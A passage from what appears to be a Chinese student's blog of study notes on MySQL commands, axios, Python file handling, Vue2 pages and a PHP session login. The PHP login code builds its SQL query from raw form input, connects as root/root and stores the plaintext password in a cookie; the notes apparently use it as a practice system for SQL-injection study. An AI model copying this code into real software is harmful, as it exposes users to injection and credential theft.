alt="image.png"><br>删除表：<br>drop table table_name;<br>drop table student;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703251049741-37bc415e-39e8-4693-8494-1892feaa9b5d.png" alt="image.png"><br>表删除列：<br>alter table table_name drop 列名；<br>alter table student drop sex;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703251250960-ce37f8e0-4ed9-4979-98fe-c4deade9fb5d.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703252311747-886a5f19-2c3a-4c85-af97-a4089d8a2fa6.png" alt="image.png"><br>列更改数据类型：<br>alter table 表名 modify column 要改的表名 数据类型<br>例如：alter table student modify column age char(20);<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703252388459-87e2b5c8-1d9b-46b2-8dcd-11e4c2e0998a.png" alt="image.png"><br>这里说一下查看表的结构为desc table_name;<br>desc student;<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703344108408-d28125af-d262-4473-916d-3b3098dfbc51.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axios的使用</title>
      <link href="/2023/12/24/axios%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2023/12/24/axios%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>模板准备好：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">  &lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">  &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">  &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">  &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./index.css&quot;</span>&gt;</span><br><span class="line">  &lt;script src=<span class="string">&quot;./vue.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;div id=<span class="string">&quot;app&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;script src=<span class="string">&quot;./axios.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script src=<span class="string">&quot;./index.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    data: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        visible: <span class="literal">false</span>,</span><br><span class="line">          &#125;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>中间添加了图片和图标，输入框等等内容，直接展现最后模板结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703158959776-99c99ed0-9acc-419c-bf3f-e90762ba4327.png" alt="image.png"></p><p>直接来到axios传输数据的各个过程与阶段：<br>首先提交数据，提交之后数据到这里。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703159139757-19279560-0f54-4aae-9496-fcc1c76db305.png" alt="image.png"><br>首先查看自己的ip地址是phpstudy的物理地址，然后通过api接口通过本地的api发送数据。</p><p>1.首先设置一个点击事件，通过点击登录触发login发送请求<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703160186151-350db8dc-8789-40d4-8841-8304ca714773.png" alt="image.png"><br>接着在登录页面对api的部分进行编写，此次使用的是axios进行post请求userdata的情况<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703160821471-a346110a-6cfa-4303-bb28-d4fca76a0bf4.png" alt="image.png"><br>完成之后在postman中进行了查看，只能发送不能接收。<br>之后用yakit进行抓包，发现发包成功<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703161353422-0af5aeae-af08-4a40-8d32-9fa18374dc0e.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703161431050-6f04bfa3-e442-4444-bc68-b490a90c19ac.png" alt="image.png"><br>接着去写后端api.php，写成之后需要考虑数据该如何进行接收。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703161649173-7d8f91d7-b401-41fd-9339-33c32bb5bfa6.png" alt="image.png"><br>直接进行判断输出结果就行。之后去yakit进行查看<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703162021136-71391358-0a19-4668-991c-cef15f772bf0.png" alt="image.png"><br>此时没有发送数据<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703162173355-7cb9acf2-25e6-42ed-9095-ada167017824.png" alt="image.png"><br>后面实验过，就算发送账号和密码到api上面，单独的api.php没有太大的变化，因为没有携带post请求过去，所以无法查看。<br>直接在yakit发送请求发现直接报错<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703162412810-2bf84df6-32c2-483e-8c33-fbe7cae9de00.png" alt="image.png"><br>整个代码中没有进行解码所以报错，添加json解码的代码就可以了,如下图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703162962634-51a0a77f-423b-4d63-a8da-dee61212a941.png" alt="image.png"><br>继续用yakit发送请求发现仍然有一个warning，但是数据已经成功发送。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703163030589-722c7bb8-d4bf-4d5d-b4a2-b878f4b056e6.png" alt="image.png"><br>多了一条解码语句所以产生了报错。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703163409632-6b51c998-cc94-47a4-b37d-b08016fa0a90.png" alt="image.png"><br>此时输出成功，后面的主页以及各个页面的跳转也一样都可以按照这个模式去做。这里给出几个模板。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703163461825-17634669-2729-48ec-bd04-bc3bdc79c15e.png" alt="image.png"><br>此时只完成了登录还没进行跳转。<br>添加一条查询语句。从数据库中查询用户名和密码。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703164046653-d482fee5-e4e3-4337-8983-de2cc7709925.png" alt="image.png"><br>给出个结果并且输出一条判断语句<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703164488940-f0b3f6c1-e84b-4118-b82f-1b92bd198da7.png" alt="image.png"><br>这里添加一条跳转语句发现失败。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703164918305-e7c2a446-5a15-4197-b509-947e83c750f3.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703165606001-d16c90a5-1370-46dc-bcb7-d98c4327b557.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件操作</title>
      <link href="/2023/12/17/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2023/12/17/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>1.找到这个文件，双击打开它<br>open(文件路径，mode&#x3D;””,encoding&#x3D;””)<br>mode:打开这个文件的目的是什么,分为读和写<br>pycharm里面创建的文件默认是UTF-8<br>文件路径:<br>      绝对路径:<br>      d:&#x2F;test1&#x2F;XXX.txt #这种路径不安全,可能不存在<br>      相对路径:相对你当前的程序而言你要找的文件在哪(相对于当前你的程序所在的文件夹)<br>       ..&#x2F;    表示上一次文件夹<br>mode:<br>       r  read(读取)</p><h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p>用open打开文件路径不报错就说明打开成功，找文件一定要找到相对应的路径<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702217700254-8328f029-68c3-465c-bc0e-d02ca676bcd2.png" alt="image.png"><br>你代表你的程序，文代表文件，f相当于一个管道，mode决定了方向因为是读取，所以市场文件的方向出发到你的程序终止，为什么open的时候没有把整个文件全部加载到内存呢？因为对于该文件是没办法判断大小的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702218263980-b15f1ba9-2a4f-4c0c-a5f5-317749359102.png" alt="image.png"><br>这里直接print(f.read()),直接输出资源.txt里面的内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702218546907-3107eb95-9281-49ae-960b-04bd26f2131e.png" alt="image.png"><br>centent&#x3D;f.read()#全部读取<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702218655474-82e96e1d-a098-444d-be86-c16f4d077c86.png" alt="image.png"><br>经过自我摸索write写的方法已经实践出来了<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702219051979-35544fe0-07a7-493b-90f7-dc1b65e753c8.png" alt="image.png"><br>结果如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702219132293-3afe7d03-7421-4ede-aab8-f35ef2ba20a2.png" alt="image.png"><br>readline这是一行一行的读取文本的内容，可以接着读取<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702219680159-f75e51b4-85de-4473-8f6c-f905e62a00f1.png" alt="image.png"><br>问题来了，打印出来的每一行之间为什么有两行空格呢？<br>这是因为print内部存在一个换行，同时在文本的每一行有一个\n的换行符<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702219892146-afa33ff3-54bc-41f8-9f7b-87c6707a01bf.png" alt="image.png"><br>该如何解决这个问题呢？这么去做：添加一个.strip()。<br> strip可以消除字符串左右两端的空白。空格，换行符，制表符<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702220134813-08bb9ebd-33a7-4172-b849-aa1148c7af41.png" alt="image.png"><br>那用什么方法可以看到换行符呢？用readlines进行查看，此时输出的是一个数组<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702220321397-db7e971a-9b62-4873-b94e-3216c69828a1.png" alt="image.png"><br>readlines和f.read()都无法解决文件太大的问题，所以readline更加重要<br> 最重要的文本读取方式(必须掌握)<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702220963610-9e1168c4-7b60-42ab-b4a0-00cf92e16bfb.png" alt="image.png"></p><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>w:write(写入)，write可以创建在该文件路径没有的文件，例如，下面美女.txt是不存在的，当我输入这一段之后进行的是创建了这个美女.txt。<br>w模式下，如果文件不存在就会自动的创建一个文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702550796040-be9eee5e-b285-4355-b48d-014538361ad4.png" alt="image.png"><br>在美女txt中随便输入一些内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551391134-95e9295e-48eb-4a81-be3b-f2303797e329.png" alt="image.png"><br>再次运行发现文件清空:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551453613-aaca6a19-a80f-4dcb-a741-c3cc1e56fc8c.png" alt="image.png"><br>写入一个嘎嘎威在这个美女.txt中<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551546591-f918d816-f29a-410f-b481-662f52388df9.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551609744-3830891f-5f59-45cb-b2b0-9f36553be65d.png" alt="image.png"><br>写入之后记得进行close<br>左边是文件,右边是程序,进行调用插根管子.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551717668-6f95d2e9-643c-416e-895c-15cccb4479a8.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702551867898-ff54fa1c-b511-48cd-a11c-e85275fa672c.png" alt="image.png"><br>案例:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702552518330-45a7735e-e71b-4333-ae54-2fe599cdebf5.png" alt="image.png"><br>可是发现一个问题就是写入之后数据是连在一起的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702552624853-805f2b12-2aba-415c-85b4-10887c82a6d9.png" alt="image.png"><br>这需要进行换行,可以直接在lst[0]+”\n”:<br>也可以直接去在每一次输出的后面加上f.write(“\n”),也可以实现换行的效果.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702552921079-b9d3a9cd-d343-41e5-b8cf-945426bb67f5.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553033397-3fc0dccc-16c9-4d55-a208-e3b9bb32c795.png" alt="image.png"><br>这个只是单个数据的输出,如果是多个数据那咋办?所以此时就需要用到for循环<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553277094-aea390e6-0c2f-4b6a-a413-d038e4b4b2d5.png" alt="image.png"><br>如果把f&#x3D;open(file&#x3D;”美女.txt”,mode&#x3D;”w”,encoding&#x3D;”utf-8”)放入到循环体中发现永远都是处于清空状态,只有最后一个数据写入时才有效果.此时发现只有赵敏和?.<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553441903-05bdd68b-6b5c-43dc-aeec-d1837eca2c3d.png" alt="image.png"><br>将管道放在循环体外就可以正常写入</p><p>接着就是a模式:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553834877-6bb769e3-f4c8-4695-aace-3e66a98b4a66.png" alt="image.png"><br>此时输出结果为:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553885806-82a1d9c3-34f8-4324-a0c0-129753cbb89a.png" alt="image.png"><br>整个笔记为:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553980783-8b82e9c8-a93b-415f-9cb0-393152fd7946.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue2写网站</title>
      <link href="/2023/12/17/vue2%E5%86%99%E7%BD%91%E7%AB%99/"/>
      <url>/2023/12/17/vue2%E5%86%99%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一-引入链接"><a href="#一-引入链接" class="headerlink" title="一.引入链接"></a>一.引入链接</h2><p>1.访问element  zn-cn官网，链接：<a href="https://element.eleme.cn/#/zh-CN/component/installation">https://element.eleme.cn/#/zh-CN/component/installation</a>   引入样式和组件库<br>2.在左侧的菜单栏的安装，复制以下代码，在vscode中新建index.php文件，粘贴到index.php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://unpkg.com/element-ui/lib/theme-chalk/index.css&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;app&quot;&gt;                             </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">  &lt;!-- import Vue before Element --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/vue@2/dist/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;!-- import JavaScript --&gt;</span><br><span class="line"> &lt;script src=&quot;https://unpkg.com/element-ui/lib/index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">   new Vue(&#123;</span><br><span class="line">     el: &#x27;#app&#x27;,</span><br><span class="line">     data: function() &#123;</span><br><span class="line">       return &#123; visible: false &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;)</span><br><span class="line"> &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>3.在左侧的菜单栏找到button按钮，复制一个蓝色按钮的代码，粘贴到<div id="app"> </div>中。复制以下三个链接在浏览器打开，然后复制代码，新建index.css  vue.js    index.js，把代码对应粘贴到这三个文件，引入样式和组件库 。<br>1.<a href="https://unpkg.com/element-ui/lib/theme-chalk/index.css">https://unpkg.com/element-ui/lib/theme-chalk/index.css</a><br>2.<a href="https://unpkg.com/vue@2/dist/vue.js">https:&#x2F;&#x2F;unpkg.com&#x2F;vue@2&#x2F;dist&#x2F;vue.js</a><br>3.<a href="https://unpkg.com/element-ui/lib/index.js">https://unpkg.com/element-ui/lib/index.js</a><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553518275-0506f334-7b1c-4fb0-8bce-e36dca6be611.png" alt="image.png"><br>4.右击index.php,在文件管理器中显示，复制上图四个文件，粘贴到虚拟机win10hei的PHPstudy的根目录下，ctrl+s保存，在phpstudy中打开网站，出现按钮。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553812206-166b195f-d1d8-4e62-9cf8-8cddb5e9cc12.png" alt="image.png"></p><h2 id="二-制作网页"><a href="#二-制作网页" class="headerlink" title="二.制作网页"></a>二.制作网页</h2><p>1.仿照老师发的网页图，制作一个图书管理系统<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702553970138-a22c4747-e55a-4f5c-8dbb-fb1abb7a3447.png" alt="b93486f7a701fa3193a7a784f352c91.png"><br>2.完成之后的图书馆截图：</p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用php编写多个网页交互</title>
      <link href="/2023/12/17/%E7%94%A8php%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E7%BD%91%E9%A1%B5%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/12/17/%E7%94%A8php%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E7%BD%91%E9%A1%B5%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<p>上午：</p><h2 id="分享和tk-php的创建"><a href="#分享和tk-php的创建" class="headerlink" title="分享和tk.php的创建"></a>分享和tk.php的创建</h2><p>进行了两位同学的学习分享，感觉日子过得很快，时间慢慢就溜走了，第一位同学分享的是kali linux命令的使用，对ls，cd,mkdir,rmove,cp等等后面的命令进行了补充与说明，也有少量的课外知识一些便捷方法等等，也让我们跟着他回忆了一遍。之后是另一位同学对自己学习python爬虫之后开发出来的一款小说软件，虽然暂时还有bug，例如使用搜索时只能搜一次就要关闭否则就会卡住等等，但是他个人能够对各个流程和代码能够很熟悉也是很厉害的，虽然对我们没有自学的来说还是有点蒙，但是还是感觉很有趣，很有意思。</p><p>之后孙哥对昨天学习的网页跳转接着介绍起来，昨天已经搭配好了环境进入这些环境配置等等就不说了而且也建立了两个页面index.php和link.php进行跳转，这里孙哥直接又新建了一个zhuye.php,由于我自己建立的是tk.php,所以后面就都这么说，也就是现在有三个页面，index.php是个html的表格，然后还包含跳转的link.php,link.php昨天实现的是登录后的界面,当然是不管失败或者成功的，而今天需要对link.php进行改写实现一个效果：登陆失败返回index.php，登陆成功进入到第三个页面tk.php。现在第三个页面tk.php主要实现的功能是注销用户会返回index.php。对于整体而言就是这个思路。不过这里也会将所有的代码记录下来。<br>这里学到了session和cookie的一些相关知识：<br>session是放在服务器的，客户端只会拿到一个ID，用来在服务器端检索对应的会话数据。cookie是放在本地的浏览器上面的可以随意篡改，相对于cookie，session更加安全，因为在cookie上能够看见完整的密码，但是在session上面的密码是进行了加密的，是一段乱组合的密码这样会更加安全。<br>index.php没有变化：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;link.php&quot;</span>&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th&gt;&lt;label <span class="keyword">for</span>=<span class="string">&quot;username&quot;</span>&gt;用户名:&lt;/label&gt;&lt;/th&gt;</span><br><span class="line">      &lt;td&gt;&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;username&quot;</span> name=<span class="string">&quot;username&quot;</span> required&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;th&gt;&lt;label <span class="keyword">for</span>=<span class="string">&quot;password&quot;</span>&gt;密码:&lt;/label&gt;&lt;/th&gt;</span><br><span class="line">      &lt;td&gt;&lt;input type=<span class="string">&quot;password&quot;</span> id=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span> required&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;登录&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;reset&quot;</span> value=<span class="string">&quot;重置&quot;</span>&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这还是一个简简单单的用户登录页面，后面就是对link.php进行修改。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">     <span class="variable">$u</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">     <span class="variable">$p</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;192.168.249.140&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;security&quot;</span>)<span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line">     <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line">     <span class="variable">$sql</span>= <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$u</span>&#x27; and password=&#x27;<span class="subst">$p</span>&#x27;&quot;</span>;</span><br><span class="line">     <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">              <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]=<span class="variable">$u</span>;</span><br><span class="line">               <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;password&#x27;</span>,<span class="variable">$p</span>,<span class="title function_ invoke__">time</span>()+<span class="number">7</span>*<span class="number">12</span>*<span class="number">60</span>*<span class="number">60</span>);</span><br><span class="line">               <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:tk.php&#x27;</span>);</span><br><span class="line">               <span class="keyword">exit</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#007BFF&#x27;&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;用户名或密码错误!请重新输入！&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;&lt;a href=&quot;./index.php&quot;&gt;返回登录&lt;/a&gt;&lt;/h2&gt;&#x27;</span>;</span><br><span class="line">              &#125;  </span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于上午一直多打了一个括号就导致跳转之后是个空白，而且这里是不提醒的。这里也简单介绍一下代码含义纯粹个人理解：<br>在header后面开启了session，之后的代码没有变化，这里提一下isset是个函数，用来判断是否有这个变量。首先是两个if语句，第一个if语句是去判断用户有没有进行提交，提交了就去给提交的密码和用户名设置变量，然后创建对数据库的连接，这个对于数据库的连接仅仅只是次效性的，也就是一次用完之后就会关闭连接，之后就是mysqli_query这个函数，它的作用是执行sql的查询语句，查询之后将结果返回到变量$result。<br>第二条if语句是用于检查查询结果集中是否存在至少一条符合条件的记录。如果存在匹配的用户记录，即用户名和密码验证成功，则执行其中的代码块，将登录成功时的用户存储在会话的变量中之后创建一个名为password的 cookie，其中存储了用户的密码，并设置了过期时间，成功登陆之后跳转到tk.php的界面。登陆失败就输出失败后的结果并跳转到index.php。由于暂时还没有第三个页面暂时就不展现效果了。<br>之后是第三个页面tk.php的编写，这里已经将comment.php和upload.php两个页面插入进来了，后面就不解释了·。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./comment.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./upload.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;当前用户:&#x27;</span> . <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">   <span class="title function_ invoke__">session_unset</span>();</span><br><span class="line">   <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#007BFF&#x27;&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;您已成功注销。&lt;br&gt;&quot;</span>;</span><br><span class="line">   <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:index.php&#x27;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#007BFF&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h2&gt;&lt;a href=&quot;?logout=ture&quot;&gt;注销&lt;/a&gt;&lt;/h2&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;错误!&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码实现了一个简单的用户身份验证和注销功能。具体来说，它的功能包括：</p><ol><li>检查用户是否已经登录，如果是则显示当前用户的用户名。</li><li>提供注销链接，允许已登录用户注销当前会话并返回到指定页面。</li><li>如果用户未登录，则将用户重定向到指定的页面，这里就是登录页。</li></ol><p>if(isset($_GET[‘logout’]))这句话的含义检查是否有名为 logout的 GET 请求参数，如果有，则执行注销操作。<br>echo ‘<h2><a href="?logout=ture">注销</a></h2>‘在页面上输出一个注销链接，链接到当前页面并附带了注销参数。<br>整体一个效果就是这样的：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702478721040-dbcdcc20-14fa-44fb-8591-00731ade891e.png" alt="image.png"><br>上述情况是用户名和密码正确的案例，点击注销就会·跳转到index.php。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702478869490-fa232e94-3711-4c14-86ae-a04e38cd6d35.png" alt="image.png"><br>这里也一样点击返回登录，就会跳转到index.php。</p><p>下午：</p><h2 id="comment-php和upload-php的创建"><a href="#comment-php和upload-php的创建" class="headerlink" 